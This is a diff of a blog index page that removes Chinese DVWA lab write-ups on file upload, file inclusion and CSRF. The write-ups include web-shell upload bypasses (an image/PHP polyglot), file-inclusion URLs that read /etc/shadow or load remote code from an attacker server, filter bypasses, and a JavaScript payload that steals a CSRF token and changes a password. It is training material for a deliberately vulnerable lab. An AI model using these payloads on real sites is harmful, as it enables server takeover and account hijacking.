class="line">            echo &#39;&lt;pre&gt;Your image was not uploaded.&lt;&#x2F;pre&gt;&#39;; </span><br><span class="line">        &#125; </span><br><span class="line">        else &#123; </span><br><span class="line">            &#x2F;&#x2F; Yes! </span><br><span class="line">            echo &quot;&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;&#x2F;pre&gt;&quot;; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">    else &#123; </span><br><span class="line">        &#x2F;&#x2F; Invalid file </span><br><span class="line">        echo &#39;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;&#x2F;pre&gt;&#39;; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>medium级别限制了上传文件大小和文件类型，文件大小没有问题(一句话木马就一句话)，关于文件类型有以下方式绕过</p>
-<p>（1）抓包更改文件后缀</p>
-<p>令我们一句话木马文件为shell.php.jpg</p>
-<p>![1554621532888](E:\网络空间信息安全\测试靶场\DVWA\分类详解\File upload\assets\1554621532888.png)</p>
-<p>将shell.php.png改为shell.php，发送数据，文件上传成功，连接菜刀getshell</p>
-<p>![1554621594473](E:\网络空间信息安全\测试靶场\DVWA\分类详解\File upload\assets\1554621594473.png)</p>
-<p>（2）利用文件包含漏洞解析文件上传图片</p>
-<p>将shell.php保存在shell.png，上传成功</p>
-<p>![1554876473272](E:\网络空间信息安全\测试靶场\DVWA\分类详解\File upload\assets\1554876473272.png)</p>
-<p>利用蚁剑，先登录网站保存cookie，然后利用文件包含漏洞把png解析为php，链接如下</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;dvwa&#x2F;vulnerabilities&#x2F;fi&#x2F;?page&#x3D;D:\phpStudy\WWW\DVWA\hackable\uploads\shell.png</span><br></pre></td></tr></table></figure>
-
-<p>蚁剑连接getshell</p>
-<p>![1554876604347](E:\网络空间信息安全\测试靶场\DVWA\分类详解\File upload\assets\1554876604347.png)</p>
-<h2 id="High"><a href="#High" class="headerlink" title="High"></a>High</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line">if( isset( $_POST[ &#39;Upload&#39; ] ) ) &#123; </span><br><span class="line">    &#x2F;&#x2F; Where are we going to be writing to? </span><br><span class="line">    $target_path  &#x3D; DVWA_WEB_PAGE_TO_ROOT . &quot;hackable&#x2F;uploads&#x2F;&quot;; </span><br><span class="line">    $target_path .&#x3D; basename( $_FILES[ &#39;uploaded&#39; ][ &#39;name&#39; ] ); </span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; File information </span><br><span class="line">    $uploaded_name &#x3D; $_FILES[ &#39;uploaded&#39; ][ &#39;name&#39; ]; </span><br><span class="line">    $uploaded_ext  &#x3D; substr( $uploaded_name, strrpos( $uploaded_name, &#39;.&#39; ) + 1); </span><br><span class="line">    $uploaded_size &#x3D; $_FILES[ &#39;uploaded&#39; ][ &#39;size&#39; ]; </span><br><span class="line">    $uploaded_tmp  &#x3D; $_FILES[ &#39;uploaded&#39; ][ &#39;tmp_name&#39; ]; </span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Is it an image? </span><br><span class="line">    if( ( strtolower( $uploaded_ext ) &#x3D;&#x3D; &quot;jpg&quot; || strtolower( $uploaded_ext ) &#x3D;&#x3D; &quot;jpeg&quot; || strtolower( $uploaded_ext ) &#x3D;&#x3D; &quot;png&quot; ) &amp;&amp; </span><br><span class="line">        ( $uploaded_size &lt; 100000 ) &amp;&amp; </span><br><span class="line">        getimagesize( $uploaded_tmp ) ) &#123; </span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; Can we move the file to the upload folder? </span><br><span class="line">        if( !move_uploaded_file( $uploaded_tmp, $target_path ) ) &#123; </span><br><span class="line">            &#x2F;&#x2F; No </span><br><span class="line">            echo &#39;&lt;pre&gt;Your image was not uploaded.&lt;&#x2F;pre&gt;&#39;; </span><br><span class="line">        &#125; </span><br><span class="line">        else &#123; </span><br><span class="line">            &#x2F;&#x2F; Yes! </span><br><span class="line">            echo &quot;&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;&#x2F;pre&gt;&quot;; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">    else &#123; </span><br><span class="line">        &#x2F;&#x2F; Invalid file </span><br><span class="line">        echo &#39;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;&#x2F;pre&gt;&#39;; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>代码审计可知，high级别的代码进行了文件头检测，但我们可以通过图片一句话绕过</p>
-<p>准备1.php和1.jpg，Dos界面执行如下命令</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy 1.jpg&#x2F;b+1.php&#x2F;a shell.jpg</span><br></pre></td></tr></table></figure>
-
-<p>![1554876856999](E:\网络空间信息安全\测试靶场\DVWA\分类详解\File upload\assets\1554876856999.png)</p>
-<p>一句话木马制作成功，上传成功</p>
-<p>![1554877060368](E:\网络空间信息安全\测试靶场\DVWA\分类详解\File upload\assets\1554877060368.png)</p>
-<p>同样利用文件包含漏洞进行解析</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;dvwa&#x2F;vulnerabilities&#x2F;fi&#x2F;?page&#x3D;file:&#x2F;&#x2F;&#x2F;D:\phpStudy\WWW\DVWA\hackable\uploads\shell.jpg</span><br></pre></td></tr></table></figure>
-
-<p>![1554877433962](E:\网络空间信息安全\测试靶场\DVWA\分类详解\File upload\assets\1554877433962.png)</p>
-<p>成功getshell</p>
-<h2 id="Impossible"><a href="#Impossible" class="headerlink" title="Impossible"></a>Impossible</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line">if( isset( $_POST[ &#39;Upload&#39; ] ) ) &#123; </span><br><span class="line">    &#x2F;&#x2F; Check Anti-CSRF token </span><br><span class="line">    checkToken( $_REQUEST[ &#39;user_token&#39; ], $_SESSION[ &#39;session_token&#39; ], &#39;index.php&#39; ); </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; File information </span><br><span class="line">    $uploaded_name &#x3D; $_FILES[ &#39;uploaded&#39; ][ &#39;name&#39; ]; </span><br><span class="line">    $uploaded_ext  &#x3D; substr( $uploaded_name, strrpos( $uploaded_name, &#39;.&#39; ) + 1); </span><br><span class="line">    $uploaded_size &#x3D; $_FILES[ &#39;uploaded&#39; ][ &#39;size&#39; ]; </span><br><span class="line">    $uploaded_type &#x3D; $_FILES[ &#39;uploaded&#39; ][ &#39;type&#39; ]; </span><br><span class="line">    $uploaded_tmp  &#x3D; $_FILES[ &#39;uploaded&#39; ][ &#39;tmp_name&#39; ]; </span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Where are we going to be writing to? </span><br><span class="line">    $target_path   &#x3D; DVWA_WEB_PAGE_TO_ROOT . &#39;hackable&#x2F;uploads&#x2F;&#39;; </span><br><span class="line">    &#x2F;&#x2F;$target_file   &#x3D; basename( $uploaded_name, &#39;.&#39; . $uploaded_ext ) . &#39;-&#39;; </span><br><span class="line">    $target_file   &#x3D;  md5( uniqid() . $uploaded_name ) . &#39;.&#39; . $uploaded_ext; </span><br><span class="line">    $temp_file     &#x3D; ( ( ini_get( &#39;upload_tmp_dir&#39; ) &#x3D;&#x3D; &#39;&#39; ) ? ( sys_get_temp_dir() ) : ( ini_get( &#39;upload_tmp_dir&#39; ) ) ); </span><br><span class="line">    $temp_file    .&#x3D; DIRECTORY_SEPARATOR . md5( uniqid() . $uploaded_name ) . &#39;.&#39; . $uploaded_ext; </span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Is it an image? </span><br><span class="line">    if( ( strtolower( $uploaded_ext ) &#x3D;&#x3D; &#39;jpg&#39; || strtolower( $uploaded_ext ) &#x3D;&#x3D; &#39;jpeg&#39; || strtolower( $uploaded_ext ) &#x3D;&#x3D; &#39;png&#39; ) &amp;&amp; </span><br><span class="line">        ( $uploaded_size &lt; 100000 ) &amp;&amp; </span><br><span class="line">        ( $uploaded_type &#x3D;&#x3D; &#39;image&#x2F;jpeg&#39; || $uploaded_type &#x3D;&#x3D; &#39;image&#x2F;png&#39; ) &amp;&amp; </span><br><span class="line">        getimagesize( $uploaded_tmp ) ) &#123; </span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; Strip any metadata, by re-encoding image (Note, using php-Imagick is recommended over php-GD) </span><br><span class="line">        if( $uploaded_type &#x3D;&#x3D; &#39;image&#x2F;jpeg&#39; ) &#123; </span><br><span class="line">            $img &#x3D; imagecreatefromjpeg( $uploaded_tmp ); </span><br><span class="line">            imagejpeg( $img, $temp_file, 100); </span><br><span class="line">        &#125; </span><br><span class="line">        else &#123; </span><br><span class="line">            $img &#x3D; imagecreatefrompng( $uploaded_tmp ); </span><br><span class="line">            imagepng( $img, $temp_file, 9); </span><br><span class="line">        &#125; </span><br><span class="line">        imagedestroy( $img ); </span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; Can we move the file to the web root from the temp folder? </span><br><span class="line">        if( rename( $temp_file, ( getcwd() . DIRECTORY_SEPARATOR . $target_path . $target_file ) ) ) &#123; </span><br><span class="line">            &#x2F;&#x2F; Yes! </span><br><span class="line">            echo &quot;&lt;pre&gt;&lt;a href&#x3D;&#39;$&#123;target_path&#125;$&#123;target_file&#125;&#39;&gt;$&#123;target_file&#125;&lt;&#x2F;a&gt; succesfully uploaded!&lt;&#x2F;pre&gt;&quot;; </span><br><span class="line">        &#125; </span><br><span class="line">        else &#123; </span><br><span class="line">            &#x2F;&#x2F; No </span><br><span class="line">            echo &#39;&lt;pre&gt;Your image was not uploaded.&lt;&#x2F;pre&gt;&#39;; </span><br><span class="line">        &#125; </span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; Delete any temp files </span><br><span class="line">        if( file_exists( $temp_file ) ) </span><br><span class="line">            unlink( $temp_file ); </span><br><span class="line">    &#125; </span><br><span class="line">    else &#123; </span><br><span class="line">        &#x2F;&#x2F; Invalid file </span><br><span class="line">        echo &#39;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;&#x2F;pre&gt;&#39;; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Generate Anti-CSRF token </span><br><span class="line">generateSessionToken(); </span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-
-      
-      
-    
-      <div class="declare" hidden="hidden"></div>
-    
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2020/01/04/DVWA/%E5%88%86%E7%B1%BB%E8%AF%A6%E8%A7%A3/File%20upload/File_upload/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-<!--显示阅读次数-->
-
-
-  
-    <article id="post-DVWA/分类详解/File Inclusion/file_Inclusion" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/01/04/DVWA/%E5%88%86%E7%B1%BB%E8%AF%A6%E8%A7%A3/File%20Inclusion/file_Inclusion/">DVWA/分类详解/File Inclusion/file_Inclusion</a>
-    </h1>
-  
-
-        
-        <a href="/2020/01/04/DVWA/%E5%88%86%E7%B1%BB%E8%AF%A6%E8%A7%A3/File%20Inclusion/file_Inclusion/" class="archive-article-date">
-  	<time datetime="2020-01-03T16:05:17.529Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-01-04</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="File-Inclusion"><a href="#File-Inclusion" class="headerlink" title="File Inclusion"></a>File Inclusion</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">文件包含（漏洞），是指当服务器开启allow_url_include选项时，就可以通过php的某些特性函数（include()，require()和include_once()，require_once()）利用url去动态包含文件，此时如果没有对文件来源进行严格审查，就会导致任意文件读取或者任意命令执行。文件包含漏洞分为本地文件包含漏洞与远程文件包含漏洞，远程文件包含漏洞是因为开启了php配置中的allow_url_fopen选项（选项开启之后，服务器允许包含一个远程的文件）。</span><br></pre></td></tr></table></figure>
-
-<h2 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; The page we wish to display </span><br><span class="line">$file &#x3D; $_GET[ &#39;page&#39; ]; </span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>可以看到page参数没有经过任何过滤，可以读取任意文件</p>
-<p>本地文件包含</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;dvwa&#x2F;vulnerabilities&#x2F;fi&#x2F;?page&#x3D;&#x2F;etc&#x2F;shadow		#读取shadow文件</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;dvwa&#x2F;vulnerabilities&#x2F;fi&#x2F;?page&#x3D;..&#x2F;..&#x2F;..&#x2F;2.txt	</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;dvwa&#x2F;vulnerabilities&#x2F;fi&#x2F;?page&#x3D;C:\Users\Administrator\Desktop\password.txt				可以读取本地文件</span><br></pre></td></tr></table></figure>
-
-<p>php版本小于5.3.4的服务器中，当Magic_quote_gpc选项为off时，我们可以在文件名中使用%00进行截断，也就是说文件名中%00后的内容不会被识别</p>
-<p>远程文件包含</p>
-<p>当服务器的php配置中，选项allow_url_fopen与allow_url_include为开启状态时，服务器会允许包含远程服务器上的文件，如果对文件来源没有检查的话，就容易导致任意远程代码执行。</p>
-<p>在服务器端写入文件phpinfo.txt，内容为&lt;?php phpinfo();&gt;</p>
-<p>下面进行远程文件包含</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;dvwa&#x2F;vulnerabilities&#x2F;fi&#x2F;?page&#x3D;http:&#x2F;&#x2F;服务器ip&#x2F;phpinfo.txt</span><br></pre></td></tr></table></figure>
-
-<p>可以对page参数进行url编码隐藏</p>
-<h2 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; The page we wish to display </span><br><span class="line">$file &#x3D; $_GET[ &#39;page&#39; ]; </span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Input validation </span><br><span class="line">$file &#x3D; str_replace( array( &quot;http:&#x2F;&#x2F;&quot;, &quot;https:&#x2F;&#x2F;&quot; ), &quot;&quot;, $file ); </span><br><span class="line">$file &#x3D; str_replace( array( &quot;..&#x2F;&quot;, &quot;..\&quot;&quot; ), &quot;&quot;, $file ); </span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>代码审计可知，medium将http://、https:// 、../、..\替换为空，但我们仍然可以进行双写绕过（只影响相对路径，绝对路径不受影响）</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;dvwa&#x2F;vulnerabilities&#x2F;fi&#x2F;?page&#x3D;...&#x2F;.&#x2F;...&#x2F;.&#x2F;...&#x2F;.&#x2F;1.txt</span><br></pre></td></tr></table></figure>
-
-<p>远程文件包含</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;dvwa&#x2F;vulnerabilities&#x2F;fi&#x2F;?page&#x3D;hthttp:&#x2F;&#x2F;tp:&#x2F;&#x2F;服务器ip&#x2F;phpinfo.txt</span><br></pre></td></tr></table></figure>
-
-<h2 id="High"><a href="#High" class="headerlink" title="High"></a>High</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; The page we wish to display </span><br><span class="line">$file &#x3D; $_GET[ &#39;page&#39; ]; </span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Input validation </span><br><span class="line">if( !fnmatch( &quot;file*&quot;, $file ) &amp;&amp; $file !&#x3D; &quot;include.php&quot; ) &#123; </span><br><span class="line">    &#x2F;&#x2F; This isn&#39;t the page we want! </span><br><span class="line">    echo &quot;ERROR: File not found!&quot;; </span><br><span class="line">    exit; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>fnmatch按照指定的模式来匹配文件名或字符串，这里要求page参数的开头必须是file，但我们可以通过file协议绕过</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;dvwa&#x2F;vulnerabilities&#x2F;fi&#x2F;?page&#x3D;file:&#x2F;&#x2F;&#x2F;C:\Users\Administrator\Desktop\password.txt</span><br></pre></td></tr></table></figure>
-
-<h2 id="Impossible"><a href="#Impossible" class="headerlink" title="Impossible"></a>Impossible</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; The page we wish to display </span><br><span class="line">$file &#x3D; $_GET[ &#39;page&#39; ]; </span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Only allow include.php or file&#123;1..3&#125;.php </span><br><span class="line">if( $file !&#x3D; &quot;include.php&quot; &amp;&amp; $file !&#x3D; &quot;file1.php&quot; &amp;&amp; $file !&#x3D; &quot;file2.php&quot; &amp;&amp; $file !&#x3D; &quot;file3.php&quot; ) &#123; </span><br><span class="line">    &#x2F;&#x2F; This isn&#39;t the page we want! </span><br><span class="line">    echo &quot;ERROR: File not found!&quot;; </span><br><span class="line">    exit; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>限定了只能够访问file1.php、file2.php、file3.php,基本防御了文件包含漏洞</p>
-
-      
-      
-    
-      <div class="declare" hidden="hidden"></div>
-    
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2020/01/04/DVWA/%E5%88%86%E7%B1%BB%E8%AF%A6%E8%A7%A3/File%20Inclusion/file_Inclusion/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-<!--显示阅读次数-->
-
-
-  
-    <article id="post-DVWA/分类详解/CSRF/xss" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/01/04/DVWA/%E5%88%86%E7%B1%BB%E8%AF%A6%E8%A7%A3/CSRF/xss/">DVWA/分类详解/CSRF/xss</a>
-    </h1>
-  
-
-        
-        <a href="/2020/01/04/DVWA/%E5%88%86%E7%B1%BB%E8%AF%A6%E8%A7%A3/CSRF/xss/" class="archive-article-date">
-  	<time datetime="2020-01-03T16:05:17.489Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-01-04</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        alert(document.cookie);
-
-var theUrl = 'http://127.0.0.1/dvwa/vulnerabilities/csrf/';
-if(window.XMLHttpRequest) {
-    xmlhttp = new XMLHttpRequest();
-}else{
-    xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
-}
-var count = 0;
-xmlhttp.withCredentials = true;
-xmlhttp.onreadystatechange=function(){
-    if(xmlhttp.readyState ==4 && xmlhttp.status==200)
-    {
-        var text = xmlhttp.responseText;
-        var regex = /user_token\' value\=\'(.*?)\' \/\>/;
-        var match = text.match(regex);
-        console.log(match);
-        alert(match[1]);
-            var token = match[1];
-                var new_url = 'http://127.0.0.1/dvwa/vulnerabilities/csrf/?user_token='+token+'&password_new=hello&password_conf=hello&Change=Change';
-                if(count==0){
-                    count++;
-                    xmlhttp.open("GET",new_url,false);
-                    xmlhttp.send();
-                }
-    }
-};
-xmlhttp.open("GET",theUrl,false);
-xmlhttp.send();
-
-      
-      
-    
-      <div class="declare" hidden="hidden"></div>
-    
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2020/01/04/DVWA/%E5%88%86%E7%B1%BB%E8%AF%A6%E8%A7%A3/CSRF/xss/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-<!--显示阅读次数-->
-
-
-  
-  
-    <nav id="page-nav">
-      <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/">Next &amp;raquo;</a>
-    </nav>
   
 
 
@@ -1261,11 +733,11 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">计算机核心课程</a>
+                <a href="javascript:void(0)" class="js-tag color5">技术文档</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">技术文档</a>
+                <a href="javascript:void(0)" class="js-tag color3">计算机核心课程</a>
               </li>
              
               <li class="article-tag-list-item">
